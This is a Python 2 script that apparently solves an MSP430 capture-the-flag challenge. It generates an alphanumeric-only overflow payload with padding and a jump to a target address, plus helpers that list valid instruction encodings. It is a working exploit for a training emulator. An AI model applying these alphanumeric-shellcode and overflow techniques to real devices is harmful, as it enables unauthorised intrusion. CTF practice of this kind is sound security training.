
# allowable bytes:   30-39  41-5a  61-7a

ok = range(0x30, 0x3a) + range(0x41,0x5b) + range(0x61,0x7b)

def hhhh(n):
    return hex(n)[-4:]
def hh(n):
    return hex(n)[-2:]


import disasm

# load ff into r15:
#   7863           addc.b 	#-0x1, r8
#   6263           addc.b 	#0x2, sr
#   4f68           addc.b 	r8, r15

# jump to 4604
#   nop until sizeof(buf) = 0x11f
#   4949           mov.b 	r9, r9
#   ...
#   7a3c           jmp	$+0xf4

# 7a 3030 3131 3232 3333 3434 3535 3636 3446 3044 5646 4242 4343 4444 4545 4646 4747 4848 6161 6262 6363 6464 6565 6666 6767 6868 6161 6262 6363 6464 6565 6666 6767 6868 7863 6263 4f68 3041

def main():
    #gen_poss_instrs()
    gen_pwd()

def gen_pwd():
    mem =("3030 3131 3232 3333 3434 3535 3636 3446 " +
        "3044 5646 4242 4343 4444 4545 4646 4747 " +
        "4848 6161 6262 6363 6464 6565 6666 6767 " +
        "6868 6161 6262 6363 6464 6565 6666 6767 " +
        "6868 7863 6263 4f68 3034 ")

    for i in range(0x30):
        mem += "3041 "

    while ((len(mem) / 5) * 2) < 0x120:
        mem += "4949 "

    mem += "7a34"

    print '>7a ' + mem + '<'


def gen_poss_instrs():
    curr_instr = 0
    def fetch_mem(addr):
        return curr_instr if addr == 0 else 0

    for b1 in ok:
        for b2 in ok:
            curr_instr = b2 | (b1 << 8)
            disasm.decode( fetch_mem, 0, False, True )


def dump_all_valid():
    addr = 0x4400
    lines = []
    for b1 in ok:
        for b2 in ok:
            lines.append( ('%04x'%addr) + ':  ' + hh(b1) + hh(b2) + '  xx\n' )
            addr += 2
            lines.append( ('%04x'%addr) + ':  0000  xx\n' )
            addr += 2
            lines.append( ('%04x'%addr) + ':  0000  xx\n' )
            addr += 2

    with open('alpha.mem','wt') as outf:
        outf.writelines( lines )


main()
            